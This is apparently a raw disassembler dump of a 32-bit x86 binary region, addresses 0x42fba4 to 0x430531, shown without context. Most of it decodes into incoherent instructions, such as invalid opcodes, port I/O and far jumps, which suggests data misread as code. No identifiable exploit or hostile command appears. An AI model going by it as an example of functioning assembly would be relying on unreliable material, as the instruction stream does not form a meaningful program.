  42fba4:	cmp    al,BYTE PTR [edi+0x39321b91]
  42fbaa:	sbb    DWORD PTR [ecx+eax*4-0x34],0x56bf7c51
  42fbb2:	mov    ebp,0x4db98f6f
  42fbb7:	mov    ch,0x23
  42fbb9:	xor    DWORD PTR [esi+eiz*2+0x588267c5],eax
  42fbc0:	inc    ecx
  42fbc1:	mov    cl,0xf6
  42fbc3:	clc    
  42fbc4:	add    ecx,esi
  42fbc6:	daa    
  42fbc7:	dec    ecx
  42fbc8:	fistp  WORD PTR [esi+0x58a83878]
  42fbce:	repz add BYTE PTR [edi],0xb4
  42fbd2:	adc    bl,ch
  42fbd4:	dec    edx
  42fbd5:	pop    eax
  42fbd6:	cwde   
  42fbd7:	hlt    
  42fbd8:	(bad)  [esi]
  42fbda:	ret    0x1336
  42fbdd:	ret    
  42fbde:	xor    esp,DWORD PTR [ebx]
  42fbe0:	inc    edi
  42fbe1:	and    bh,BYTE PTR cs:[edx+0x3801417b]
  42fbe8:	stos   BYTE PTR es:[edi],al
  42fbe9:	out    0x78,al
  42fbeb:	push   ebp
  42fbec:	mov    ah,bl
  42fbee:	outs   dx,DWORD PTR ds:[esi]
  42fbef:	popf   
  42fbf0:	dec    esi
  42fbf1:	add    al,BYTE PTR [edi+0x7c]
  42fbf4:	rcl    DWORD PTR [edi+0x4384bc06],1
  42fbfa:	sub    DWORD PTR [esi+0x55249cc0],eax
  42fc00:	sub    BYTE PTR [ebx-0xc],0x99
  42fc04:	repnz dec esi
  42fc06:	daa    
  42fc07:	sub    cl,ah
  42fc09:	add    eax,esi
  42fc0b:	push   eax
  42fc0c:	xor    DWORD PTR [esi],esp
  42fc0e:	jno    0x42fb9d
  42fc10:	outs   dx,DWORD PTR ds:[esi]
  42fc11:	retf   0x1377
  42fc14:	scas   al,BYTE PTR es:[edi]
  42fc15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fc16:	(bad)  [ebp+0x51e5dd9]
  42fc1c:	inc    ebx
  42fc1d:	std    
  42fc1e:	leave  
  42fc1f:	enter  0x48bf,0x72
  42fc23:	xor    al,BYTE PTR [edi]
  42fc25:	sar    DWORD PTR [ebx+0x32],cl
  42fc28:	xor    cl,0xcb
  42fc2b:	iret   
  42fc2c:	push   es
  42fc2d:	inc    edx
  42fc2e:	lahf   
  42fc2f:	test   bl,bh
  42fc31:	arpl   WORD PTR [edx+0x61],bx
  42fc34:	mov    ds:0xf6b8c041,eax
  42fc39:	jmp    0xa6a6:0x9df3844c
  42fc40:	dec    esi
  42fc41:	mov    edx,0x5e1e0371
  42fc46:	out    dx,al
  42fc47:	imul   edi,DWORD PTR [ebp-0x357313ce],0xc600eb62
  42fc51:	sub    eax,DWORD PTR [esi-0x41]
  42fc54:	pop    ss
  42fc55:	retf   
  42fc56:	test   eax,0x88a3e2e4
  42fc5b:	push   esi
  42fc5c:	xchg   esi,eax
  42fc5d:	pop    eax
  42fc5e:	jmp    0x17b7224d
  42fc63:	mov    ebx,0x54d0c173
  42fc68:	rcr    DWORD PTR [ebx+0xd7605a],cl
	...
  42fcd6:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fcdc:	mov    ebx,0x36325e9a
  42fce1:	and    BYTE PTR [eax],dl
  42fce3:	ror    esp,1
  42fce5:	int    0x3e
  42fce7:	inc    DWORD PTR [ecx]
  42fce9:	add    bh,bh
  42fceb:	add    BYTE PTR [eax],al
  42fced:	add    BYTE PTR [edi-0x7a],dh
  42fcf0:	(bad)  
  42fcf2:	adc    DWORD PTR [ecx],edx
  42fcf4:	aas    
  42fcf5:	dec    edx
  42fcf6:	hlt    
  42fcf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fcf8:	test   BYTE PTR [ecx+0x45e9d2e6],ah
  42fcfe:	pop    DWORD PTR [eax]
  42fd00:	out    dx,eax
  42fd01:	shl    BYTE PTR [eax],1
  42fd03:	add    DWORD PTR [ebx],edi
  42fd05:	leave  
  42fd06:	xchg   edx,eax
  42fd07:	call   0x39bc3030
  42fd0c:	mov    edx,0xabf1e66b
  42fd11:	lods   al,BYTE PTR ds:[esi]
  42fd12:	jge    0x42fcdc
  42fd14:	push   edi
  42fd15:	addr16 fsubp st(0),st
  42fd18:	fisub  WORD PTR [edx+ecx*2-0x6b9006df]
  42fd1f:	pop    esi
  42fd20:	pusha  
  42fd21:	jns    0x42fd88
  42fd23:	dec    ecx
  42fd24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fd25:	mov    bh,0xb3
  42fd27:	outs   dx,BYTE PTR ds:[esi]
  42fd28:	mov    DWORD PTR [edx+ecx*4+0x75],ecx
  42fd2c:	in     eax,dx
  42fd2d:	or     DWORD PTR [esi-0x75ed1045],esp
  42fd33:	les    edx,FWORD PTR [ecx-0x5c]
  42fd36:	fild   QWORD PTR [eax+ebp*2+0x42]
  42fd3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fd3b:	push   0xffffff9c
  42fd3d:	lock sbb eax,0x86e24351
  42fd43:	adc    ebp,ecx
  42fd45:	ficomp DWORD PTR [edx+edx*2+0xee7afd0]
  42fd4c:	mov    dl,BYTE PTR [ebx]
  42fd4e:	sbb    al,0x33
  42fd50:	jb     0x42fcd7
  42fd52:	scas   eax,DWORD PTR es:[edi]
  42fd53:	xchg   ebp,eax
  42fd54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fd55:	push   esi
  42fd56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fd57:	aaa    
  42fd58:	sbb    eax,DWORD PTR [edi+0x52]
  42fd5b:	mov    al,ds:0x904f45ce
  42fd60:	in     al,dx
  42fd61:	test   eax,0x30b0b1dc
  42fd66:	shr    BYTE PTR [ebx-0x2db696b9],0x54
  42fd6d:	cmp    al,0x56
  42fd6f:	pop    esi
  42fd70:	les    edi,FWORD PTR [eax]
  42fd72:	fsubr  st(3),st
  42fd74:	or     al,bl
  42fd76:	xor    BYTE PTR [ebx-0x80],bh
  42fd79:	pop    eax
  42fd7a:	loope  0x42fd1e
  42fd7c:	push   eax
  42fd7d:	lods   eax,DWORD PTR ds:[esi]
  42fd7e:	sahf   
  42fd7f:	rcl    DWORD PTR [edi-0x66],1
  42fd82:	adc    bh,cl
  42fd84:	add    dl,0xbf
  42fd87:	ins    DWORD PTR es:[edi],dx
  42fd88:	test   al,0x4
  42fd8a:	pop    edx
  42fd8b:	icebp  
  42fd8c:	jle    0x42fdfa
  42fd8e:	adc    DWORD PTR ds:0x74afbab,esp
  42fd94:	je     0x42fd4e
  42fd96:	or     ecx,DWORD PTR [edx]
  42fd98:	cmp    BYTE PTR [ebx],bh
  42fd9a:	add    DWORD PTR [ecx+edi*1+0x2b],esp
  42fd9e:	loop   0x42fdc8
  42fda0:	cmp    eax,0xc7d62192
  42fda5:	push   0xffffff96
  42fda7:	add    DWORD PTR [ebx+eax*4],edi
  42fdaa:	xor    DWORD PTR [esi-0x6fff8bc4],0xdb98fd5c
  42fdb4:	std    
  42fdb5:	retf   
  42fdb6:	int3   
  42fdb7:	push   esi
  42fdb8:	in     al,dx
  42fdb9:	fdiv   st,st(4)
  42fdbb:	add    dh,BYTE PTR [ebp+0x1f2b39fb]
  42fdc1:	cld    
  42fdc2:	int    0x2
  42fdc4:	jmp    0x46847909
  42fdc9:	sahf   
  42fdca:	jnp    0x42fdfb
  42fdcc:	jmp    0x332ba0a9
  42fdd1:	pop    ds
  42fdd2:	mov    bh,0x75
  42fdd4:	xor    BYTE PTR [edi+ebp*2],dl
  42fdd7:	push   ecx
  42fdd8:	mov    eax,0xe7640ee7
  42fddd:	mov    ds:0xaf0c3bd,eax
  42fde2:	mov    dh,0xa9
  42fde4:	mov    al,ds:0x3d7ab52c
  42fde9:	(bad)  
  42fdea:	cmc    
  42fdeb:	int3   
  42fdec:	aaa    
	...
  42fe55:	add    BYTE PTR [eax-0x40],cl
  42fe58:	ret    0xcaf0
  42fe5b:	bnd jp 0x42fe56
  42fe5e:	cmc    
  42fe5f:	inc    edx
  42fe60:	stos   BYTE PTR es:[edi],al
  42fe61:	repz fbstp TBYTE PTR [eax-0xc]
  42fe65:	cmp    edi,DWORD PTR ds:0xff000200
  42fe6b:	add    BYTE PTR [eax],al
  42fe6d:	add    BYTE PTR [ebp+0x24e4c103],bh
  42fe73:	cs sti 
  42fe75:	lahf   
  42fe76:	cmp    eax,0x94a63323
  42fe7b:	sahf   
  42fe7c:	addr16 out dx,eax
  42fe7e:	fdiv   st(5),st
  42fe80:	add    esp,esi
  42fe82:	inc    esp
  42fe83:	fimul  DWORD PTR [edi-0xa]
  42fe86:	sub    al,0x5d
  42fe88:	ds jle 0x42fe86
  42fe8b:	sub    edx,DWORD PTR [ebp+0x28199a2]
  42fe91:	loopne 0x42fe70
  42fe93:	clc    
  42fe94:	xchg   edx,eax
  42fe95:	mov    cl,0x77
  42fe97:	(bad)  
  42fe98:	mov    eax,ds:0x9b4593a7
  42fe9d:	out    0x5f,al
  42fe9f:	aaa    
  42fea0:	inc    edi
  42fea1:	iret   
  42fea2:	adc    bl,al
  42fea4:	(bad)  
  42fea5:	mov    ebp,0x6881ef8a
  42feaa:	cmp    DWORD PTR [ebx+0x5da30b7d],edi
  42feb0:	into   
  42feb1:	or     eax,0xad966308
  42feb6:	in     eax,dx
  42feb7:	add    DWORD PTR [eax+ecx*1-0x5fa55bf7],0x53350f1f
  42fec2:	ror    BYTE PTR [ebx+0x6f4850c9],0x4
  42fec9:	les    ebx,FWORD PTR [edi-0x47]
  42fecc:	daa    
  42fecd:	and    edx,esp
  42fecf:	mov    gs,WORD PTR [ecx-0x6e4f4bc3]
  42fed5:	je     0x42ff47
  42fed7:	leave  
  42fed8:	cs inc esp
  42feda:	popa   
  42fedb:	inc    edi
  42fedc:	fwait
  42fedd:	mov    es,WORD PTR [edi-0x34]
  42fee0:	in     eax,dx
  42fee1:	mov    ah,0x40
  42fee3:	lods   eax,DWORD PTR ds:[esi]
  42fee4:	mov    gs,WORD PTR [edi+0x868405b]
  42feea:	(bad)  ds:0x5dadb752
  42fef0:	cmp    al,0x98
  42fef2:	and    BYTE PTR [edi+edi*1-0xb],bh
  42fef6:	fcom   DWORD PTR [ebp+0x7890e0db]
  42fefc:	jg     0x42fecf
  42fefe:	(bad)  
  42ff00:	sahf   
  42ff01:	sub    BYTE PTR [eax-0x5e334f77],dh
  42ff07:	std    
  42ff08:	repz add al,BYTE PTR [esi]
  42ff0b:	call   0xe5447058
  42ff10:	paddb  mm4,QWORD PTR [esi-0x50612127]
  42ff17:	les    edx,FWORD PTR [edx+0x27]
  42ff1a:	lds    esp,FWORD PTR [ebp+0x3b]
  42ff1d:	scas   eax,DWORD PTR es:[edi]
  42ff1e:	dec    esi
  42ff1f:	xor    BYTE PTR [ebp+0x2d],0xc3
  42ff23:	jae    0x42ff3d
  42ff25:	and    eax,0xdbe8f41e
  42ff2a:	cmc    
  42ff2b:	pop    es
  42ff2c:	in     eax,0x7c
  42ff2e:	repnz inc ebp
  42ff30:	imul   DWORD PTR [esi-0x64]
  42ff33:	jl     0x42feda
  42ff35:	cld    
  42ff36:	aas    
  42ff37:	leave  
  42ff38:	into   
  42ff39:	push   eax
  42ff3a:	rcl    DWORD PTR [ebp-0x7e],1
  42ff3d:	inc    eax
  42ff3e:	bound  esp,QWORD PTR gs:[edx]
  42ff41:	jge    0x42ff54
  42ff43:	xchg   BYTE PTR [ebx+0x6fc7ca0c],ch
  42ff49:	loope  0x42ffad
  42ff4b:	pop    edi
  42ff4c:	mov    esp,0x5a4fbd2b
  42ff51:	mov    eax,ds:0x62cd3c6
  42ff56:	test   eax,edx
  42ff58:	(bad)
  42ff5b:	mov    esp,0x3107e73e
  42ff60:	iret   
  42ff61:	sbb    ebp,DWORD PTR [esi+ecx*2-0x1b]
  42ff65:	mov    ds:0x5254cc4c,eax
  42ff6a:	mov    ah,0x74
  42ff6c:	bound  eax,QWORD PTR [eax]
	...
  42ffd6:	add    al,0x67
  42ffd8:	std    
  42ffd9:	aaa    
  42ffda:	(bad)  
  42ffdb:	mov    edi,0x9ffa77ce
  42ffe0:	shl    DWORD PTR [edx+ebx*4-0x26],0xb7
  42ffe5:	push   esp
  42ffe6:	cmp    al,0x1
  42ffe8:	add    al,BYTE PTR [eax]
  42ffea:	inc    DWORD PTR [eax]
  42ffec:	add    BYTE PTR [eax],al
  42ffee:	add    BYTE PTR [ecx-0x9],ch
  42fff1:	or     eax,0x9378e60c
  42fff6:	in     eax,0x37
  42fff8:	push   cs
  42fff9:	outs   dx,BYTE PTR ds:[esi]
  42fffa:	test   eax,0x7223f54
  42ffff:	pushf  
  430000:	pop    ss
  430001:	pop    esp
  430002:	jmp    0x43004e
  430004:	test   BYTE PTR fs:[edx+0x51802e18],cl
  43000b:	out    0x32,al
  43000d:	mov    cl,0xaf
  43000f:	mov    ch,0x74
  430011:	mov    edi,0xc40ec8b3
  430016:	mov    bl,0x62
  430018:	cmp    al,bl
  43001a:	or     BYTE PTR [edi-0x6c3f183c],bl
  430020:	pop    eax
  430021:	or     BYTE PTR [ecx+0x10],al
  430024:	jno    0x42ffff
  430026:	call   0xb29d845b
  43002b:	es cmc 
  43002d:	jae    0x4300ae
  43002f:	mov    eax,DWORD PTR [edx+0x57]
  430032:	imul   eax,esi,0x7bbed206
  430038:	fwait
  430039:	loopne 0x430002
  43003b:	dec    esi
  43003c:	push   0xffffffd8
  43003e:	shl    BYTE PTR [edi],1
  430040:	dec    ecx
  430041:	push   ebx
  430042:	fdiv   DWORD PTR [esi]
  430044:	fucomp st(6)
  430046:	mov    esp,0x6e78d5c8
  43004b:	dec    esp
  43004c:	inc    esp
  43004d:	rol    BYTE PTR [edi+0x50],1
  430050:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430051:	jns    0x430053
  430053:	mov    ds:0x72baba3,al
  430058:	pop    ecx
  430059:	nop
  43005a:	fadd   DWORD PTR [ebx+ecx*2-0x44246fce]
  430061:	ja     0x430012
  430063:	popf   
  430064:	pop    ebp
  430065:	inc    edi
  430066:	(bad)  
  430067:	loop   0x43000a
  430069:	gs dec ebx
  43006b:	jmp    0x1ac2a62
  430070:	push   es
  430071:	xchg   ebp,eax
  430072:	xor    BYTE PTR [ebx],bh
  430074:	jmp    0x1625:0x66c13ed2
  43007b:	lods   eax,DWORD PTR ds:[esi]
  43007d:	push   ecx
  43007e:	je     0x430017
  430080:	out    0x63,al
  430082:	pop    eax
  430083:	xlat   BYTE PTR ds:[ebx]
  430084:	xchg   edi,eax
  430085:	fistp  WORD PTR [eax-0x50]
  430088:	adc    eax,0xacaed6e1
  43008d:	imul   eax,DWORD PTR [ecx],0x5b40fccd
  430093:	mov    ds:0xbfaf3365,al
  430098:	xchg   BYTE PTR ds:0x8607a383,ch
  43009e:	stos   BYTE PTR es:[edi],al
  43009f:	and    esi,DWORD PTR [esi]
  4300a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4300a2:	xchg   esi,eax
  4300a3:	cmp    al,0xeb
  4300a5:	pop    eax
  4300a6:	adc    DWORD PTR [esi+0x61ab98e7],edx
  4300ac:	mov    WORD PTR [edi],es
  4300ae:	fstp   QWORD PTR [edx+0x4c]
  4300b1:	mov    dh,0x77
  4300b3:	js     0x430111
  4300b5:	int    0xee
  4300b7:	pop    esp
  4300b8:	outs   dx,BYTE PTR ds:[esi]
  4300b9:	aam    0x59
  4300bb:	sbb    DWORD PTR [ebx-0x378ca21f],edx
  4300c1:	dec    eax
  4300c2:	adc    esp,DWORD PTR [ecx-0x78dc0eb5]
  4300c8:	mov    bh,BYTE PTR [ebp+0x2f]
  4300cb:	add    ecx,DWORD PTR [edx-0x75]
  4300ce:	push   eax
  4300cf:	pusha  
  4300d0:	icebp  
  4300d1:	inc    eax
  4300d2:	pusha  
  4300d3:	mov    bl,dh
  4300d5:	push   cs
  4300d6:	cdq    
  4300d7:	jne    0x430154
  4300d9:	pop    edi
  4300da:	dec    esp
  4300db:	lds    ebx,FWORD PTR [ecx-0x7a878104]
  4300e1:	test   eax,0x9d039384
  4300e6:	enter  0x2ec1,0x4a
  4300ea:	(bad)  
  4300eb:	mov    edi,0xce
	...
  430154:	add    BYTE PTR [eax],al
  430156:	(bad)  
  430157:	ins    DWORD PTR es:[edi],dx
  430158:	aam    0xb5
  43015a:	(bad)  
  43015b:	mov    ebp,0x9547fe7
  430160:	scas   eax,DWORD PTR es:[edi]
  430161:	add    al,0x8b
  430163:	dec    edi
  430164:	or     edx,DWORD PTR [ebx+edi*1+0x3e000202]
  43016b:	add    BYTE PTR [eax],al
  43016d:	add    BYTE PTR [esi],dl
  43016f:	ins    DWORD PTR es:[edi],dx
  430170:	mov    cl,0xbc
  430172:	sti    
  430173:	or     esp,edx
  430175:	dec    esi
  430176:	mov    ecx,0x49761daa
  43017b:	les    eax,FWORD PTR [ecx-0x45]
  43017e:	mov    edx,0xa9292fc
  430183:	or     esp,DWORD PTR [esi-0x937f7fe]
  430189:	(bad)  
  43018a:	xor    ebp,DWORD PTR [ecx-0x10831524]
  430190:	stos   BYTE PTR es:[edi],al
  430191:	fstp   QWORD PTR [ecx+0x22a7a12e]
  430197:	push   ds
  430198:	jmp    0xc09b4140
  43019d:	mov    al,0xe6
  43019f:	imul   bx,WORD PTR gs:[eax+0x387ce003],0xffcd
  4301a8:	mov    dl,0x64
  4301aa:	adc    BYTE PTR [eax+eax*1],bh
	...
  4301d5:	add    BYTE PTR [ebp+0x55],cl
  4301d8:	mov    DWORD PTR [ebx-0x7e9e13f8],ecx
  4301de:	mov    esp,ebp
  4301e0:	or     al,ah
  4301e2:	dec    ebp
  4301e3:	add    bh,al
  4301e5:	add    BYTE PTR [eax],cl
  4301e7:	add    BYTE PTR [eax],al
  4301e9:	mov    DWORD PTR [eax],0x3ff44545
  4301ef:	xor    DWORD PTR [eax],eax
  4301f1:	test   DWORD PTR [ebx-0x34070b64],ecx
  4301f7:	(bad)  
  4301f8:	enter  0x4d45,0xb8
  4301fc:	mov    esi,DWORD PTR [edx]
  4301fe:	hlt    
  4301ff:	test   ebx,ecx
  430201:	pushf  
  430202:	enter  0x4df8,0x8b
  430206:	mov    DWORD PTR [ebp+0x8],0x894708
  43020d:	inc    ebp
  43020e:	mov    ebp,0xff8bfffc
  430213:	dec    ebp
  430214:	mov    ch,0xf4
  430216:	call   DWORD PTR [ebx-0x1]
  430219:	mov    ebx,0x8005426
  43021e:	call   DWORD PTR [ecx+0x8]
  430221:	pop    es
  430222:	jmp    0xb8:0x9cb4533
  430229:	fwait
  43022a:	mov    esi,DWORD PTR [edx-0xc]
  43022d:	xor    al,bl
  43022f:	add    BYTE PTR [ebx+0x3c83203],bl
  430235:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  43023b:	mov    eax,DWORD PTR [ebx-0xb87b3]
  430241:	xor    eax,DWORD PTR [eax]
  430243:	retf   
  430244:	ret    
  430245:	add    eax,esi
  430247:	enter  0x8945,0x64
  43024b:	dec    ebp
  43024c:	sbb    ah,cl
  43024e:	add    BYTE PTR [ebx-0xb87b277],cl
  430254:	dec    DWORD PTR [ebx-0xbcfb275]
  43025a:	test   DWORD PTR [ebx],esi
  43025c:	dec    ebx
  43025e:	inc    DWORD PTR [ebx]
  430260:	inc    eax
  430261:	enter  0x8989,0x64
  430265:	(bad)  
  430266:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  43026a:	cld    
  43026b:	dec    DWORD PTR [ebp-0xa90001]
  430271:	push   edi
  430272:	mov    BYTE PTR [edx+0x1],ch
  430275:	and    DWORD PTR [eax],eax
  430277:	pop    ecx
  430278:	inc    ebp
  430279:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  43027f:	push   0xffffff89
  430281:	pop    ecx
  430282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430283:	dec    ebp
  430284:	add    BYTE PTR [ecx+0x45fc088b],cl
  43028a:	jne    0x4302d5
  43028c:	lea    eax,[eax]
  43028e:	fs (bad) 
  430290:	dec    DWORD PTR [eax]
  430292:	mov    DWORD PTR [eax],eax
  430294:	test   al,0x0
  430296:	add    BYTE PTR [ebp-0x18],cl
  430299:	xor    ebp,DWORD PTR [edx]
  43029b:	add    eax,DWORD PTR [eax]
  43029d:	mov    eax,eax
  43029f:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4302a6:	inc    ebp
  4302a7:	mov    DWORD PTR [ebx+0x459408],ecx
  4302ad:	bound  ecx,QWORD PTR [ebx-0x372749b]
  4302b3:	inc    eax
  4302b4:	cmp    bh,0x1
  4302b7:	lea    eax,[eax]
  4302b9:	and    BYTE PTR [eax],al
  4302bb:	inc    DWORD PTR [ecx-0x18]
  4302be:	mov    ecx,DWORD PTR [ebx]
  4302c0:	cld    
  4302c1:	add    BYTE PTR [ecx+0x75014d],cl
  4302c7:	(bad)  
  4302c8:	xchg   ebp,eax
  4302c9:	sar    bh,1
  4302cb:	inc    eax
  4302cc:	inc    DWORD PTR [eax]
  4302ce:	mov    eax,DWORD PTR [ebp-0x4]
  4302d1:	xor    edx,DWORD PTR [edx+0x7201be]
  4302d7:	add    BYTE PTR [edx],dl
  4302d9:	(bad)  
  4302da:	nop
  4302db:	inc    ebp
  4302dc:	add    BYTE PTR [ebx-0x5afb0c00],cl
  4302e2:	mov    al,0xff
  4302e4:	add    bh,bh
  4302e6:	add    BYTE PTR [ebx],dh
  4302e8:	inc    DWORD PTR [ebx]
  4302ea:	sbb    al,0x89
  4302ec:	jne    0x4302ca
  4302ee:	mov    esp,DWORD PTR [ecx+0x4500fc]
  4302f4:	mov    eax,DWORD PTR [ebp-0xff0048]
  4302fa:	mov    DWORD PTR [eax-0x70],0xec70ed89
  430301:	inc    DWORD PTR [ebp-0x75]
  430304:	fisttp QWORD PTR [esi+ebp*8]
  430307:	test   DWORD PTR [esi-0x1],esp
  43030a:	inc    ebp
  43030b:	(bad)  
  43030c:	aas    
  43030d:	inc    ebp
  43030e:	(bad)  
  43030f:	lea    edi,[eax+edi*2-0x1]
  430313:	inc    edi
  430315:	mov    DWORD PTR ds:0x8000c7a0,edi
  43031b:	mov    ebp,esp
  43031d:	cld    
  43031e:	loop   0x4302ad
  430320:	inc    ebp
  430321:	(bad)  
  430322:	out    dx,al
  430323:	(bad)  
  430324:	fisttp WORD PTR [eax+0x8801c7]
  43032a:	jecxz  0x430371
  43032c:	in     al,dx
  43032d:	inc    DWORD PTR [ebp-0x4]
  430330:	out    0x8d,eax
  430332:	aas    
  430333:	(bad)  
  430334:	call   0xcb2e38
  430339:	add    DWORD PTR [ebx-0x7f490400],ecx
  43033f:	add    BYTE PTR [ecx],al
  430341:	test   DWORD PTR [eax],eax
  430343:	wrmsr  
  430345:	ja     0x430342
  430347:	add    BYTE PTR [eax],al
  430349:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43034f:	add    esp,edi
  430351:	add    BYTE PTR [eax+0x450108],al
  430357:	mov    edi,DWORD PTR [ebp-0x6c]
  43035a:	add    DWORD PTR [eax],0x4
  43035d:	mov    eax,DWORD PTR [ebp+0x3]
  430360:	mov    edi,DWORD PTR [esp+edi*8]
  430363:	dec    ebp
  430364:	nop
  430365:	mov    eax,DWORD PTR [ecx]
  430367:	fadd   DWORD PTR [eax]
  430369:	add    BYTE PTR [ecx*4-0xafa000],dl
  430370:	inc    ebp
  430371:	push   edx
  430372:	call   DWORD PTR [ebp-0x7b]
  430375:	mov    esi,DWORD PTR [ebp-0x74]
  430378:	mov    eax,DWORD PTR [eax]
  43037a:	cld    
  43037b:	mov    eax,DWORD PTR [eax+0x880103]
  430381:	add    BYTE PTR [ebp+0x6a],bh
  430384:	cmp    edi,0x10
  430387:	mov    WORD PTR [ebp+0x0],es
  43038a:	mov    edx,DWORD PTR [edx-0x4]
  43038d:	push   ecx
  43038e:	nop
  43038f:	inc    DWORD PTR [ecx]
  430391:	cld    
  430392:	add    BYTE PTR [ebp-0x16],bh
  430395:	mov    eax,DWORD PTR [eax]
  430397:	cld    
  430398:	push   eax
  430399:	nop
  43039a:	inc    ebp
  43039b:	add    edi,edi
  43039d:	add    BYTE PTR [ebx+0x4de2f445],cl
  4303a3:	jmp    0xe33b:0x9403c733
  4303aa:	movntq QWORD PTR [edx],mm7
  4303ad:	mov    DWORD PTR [eax],0xb87e8b98
  4303b3:	test   ebx,eax
  4303b5:	jmp    DWORD PTR [ebp-0x1]
  4303b8:	int    0xed
  4303ba:	sub    esp,esi
  4303bc:	add    eax,DWORD PTR [ebp-0x30]
  4303bf:	fild   WORD PTR [ebp+0x3f]
  4303c2:	cmp    eax,edi
  4303c4:	je     0xc043e9ea
  4303ca:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  4303d1:	(bad)  
  4303d2:	jne    0x430360
  4303d4:	mov    ebx,ebp
  4303d6:	cld    
  4303d7:	jle    0x43041e
  4303d9:	dec    ecx
  4303da:	mov    eax,DWORD PTR [eax]
  4303dc:	mov    ah,0x50
  4303de:	add    BYTE PTR [ebp-0x18],al
  4303e1:	mov    ebp,DWORD PTR [ecx]
  4303e3:	test   al,0x0
  4303e5:	add    BYTE PTR [ebx-0x7f170301],cl
  4303eb:	add    DWORD PTR es:[eax],eax
  4303ee:	add    al,al
  4303f0:	xor    BYTE PTR [eax+0x4f],dl
  4303f3:	inc    ebp
  4303f4:	add    BYTE PTR [ebx+0xfcd88b],cl
  4303fa:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  430400:	add    DWORD PTR [ecx+0x458be845],ecx
  430406:	fmul   DWORD PTR [ebx+0x8bb800]
  43040c:	cld    
  43040d:	call   0xd82ed2
  430412:	dec    DWORD PTR [ebx+0x109ee8ff]
  430418:	add    al,al
  43041a:	push   eax
  43041b:	es inc ebp
  43041d:	inc    ebp
  43041e:	mov    ecx,DWORD PTR [ebx+0xd89c]
  430424:	dec    DWORD PTR [ebx-0x3ff70301]
  43042a:	mov    DWORD PTR gs:[eax],eax
  43042d:	call   0x8c134967
  430432:	sar    BYTE PTR [eax-0x17baffd8],0x8b
  430439:	sub    eax,ebx
  43043b:	add    BYTE PTR [eax],al
  43043d:	mov    ecx,DWORD PTR [ebx-0x3fef0318]
  430443:	inc    ebp
  430444:	push   ebp
  430445:	mov    ebp,eax
  430447:	shr    BYTE PTR [ecx],1
  430449:	ret    
  43044a:	add    dh,al
  43044c:	mov    eax,ecx
  43044e:	cld    
  43044f:	test   BYTE PTR [eax+0x101],al
  430455:	inc    ebp
  430456:	xor    BYTE PTR [ebx],dh
  430458:	push   edi
  430459:	mov    ecx,0xffe48d89
  43045e:	inc    ebp
  43045f:	enter  0x4d8b,0xfc
  430463:	mov    eax,ebx
  430465:	or     BYTE PTR [ebx+0x38732c1],bl
  43046b:	add    DWORD PTR [ebp-0xbac000],ecx
  430471:	add    al,ch
  430473:	add    BYTE PTR [ecx],ch
  430475:	inc    DWORD PTR [eax]
  430477:	cld    
  430478:	mov    edi,DWORD PTR [ebp-0xc]
  43047b:	mov    esi,DWORD PTR [ebp-0x4]
  43047e:	xor    edx,DWORD PTR [eax+0x8d0103]
  430484:	and    BYTE PTR [ebp+0x50e800ff],bl
  43048a:	sub    DWORD PTR [ebp+0x0],eax
  43048d:	mov    edi,edi
  43048f:	test   al,0xe4
  430491:	add    BYTE PTR [ebp-0x1],cl
  430494:	xor    ebp,eax
  430496:	add    esp,DWORD PTR [esi]
  430498:	cmp    eax,DWORD PTR [eax]
  43049a:	jne    0x4304e9
  43049c:	(bad)  
  43049d:	mov    ebx,eax
  43049f:	pushf  
  4304a0:	add    BYTE PTR [eax],al
  4304a2:	add    BYTE PTR [ecx-0x37474bb],cl
  4304a8:	or     BYTE PTR [eax+0x8401c3],bh
  4304ae:	fwait
  4304af:	jne    0x4304e3
  4304b1:	xor    ecx,DWORD PTR [ecx+0x457c088d]
  4304b7:	inc    DWORD PTR [ebp-0x74d68b18]
  4304bd:	add    BYTE PTR [eax+0x33fc4d8b],bh
  4304c3:	or     BYTE PTR [ebp+0x72000801],0x30
  4304ca:	add    BYTE PTR [edi+0x45],dl
  4304cd:	or     DWORD PTR [ebx-0x3c95471c],0xffffffff
  4304d4:	gs test ebp,ecx
  4304d7:	je     0x430504
  4304d9:	mov    eax,DWORD PTR [ebx]
  4304db:	cld    
  4304dc:	sar    BYTE PTR [eax+0x3b0145],1
  4304e2:	pcmpeqw mm4,mm2
  4304e5:	xor    edi,edi
  4304e7:	lea    ecx,[ebx-0x23927470]
  4304ed:	add    BYTE PTR [ebp+0x50],cl
  4304f0:	cmp    eax,DWORD PTR [ebp+0x75]
  4304f3:	mov    ebp,DWORD PTR [eax-0x68]
  4304f6:	test   DWORD PTR [eax],eax
  4304f8:	clc    
  4304f9:	push   DWORD PTR [ebp-0x1]
  4304fc:	lea    ecx,[eax]
  4304fe:	int3   
  4304ff:	inc    ebp
  430500:	call   0xfb3690
  430505:	jne    0x4304ff
  430507:	xor    edi,DWORD PTR [ebp-0x41]
  43050a:	jmp    0x43057e
  43050c:	mov    eax,DWORD PTR [eax]
  43050e:	mov    eax,0x339545c7
  430513:	inc    DWORD PTR [ebx]
  430515:	push   DWORD PTR [ecx]
  430517:	inc    ecx
  430518:	mov    eax,DWORD PTR [eax]
  43051a:	jmp    0x43056c
  43051c:	mov    eax,DWORD PTR [ebp-0x3c]
  43051f:	mov    eax,eax
  430521:	cld    
  430522:	clc    
  430523:	ret    
  430524:	test   bh,al
  430526:	pop    es
  430527:	xchg   ebp,eax
  430528:	add    bh,bh
  43052a:	inc    ebp
  43052b:	dec    DWORD PTR [edi]
  43052d:	sub    ebp,DWORD PTR [ebx]
  43052f:	add    BYTE PTR [eax],al
  430531:	push   eax
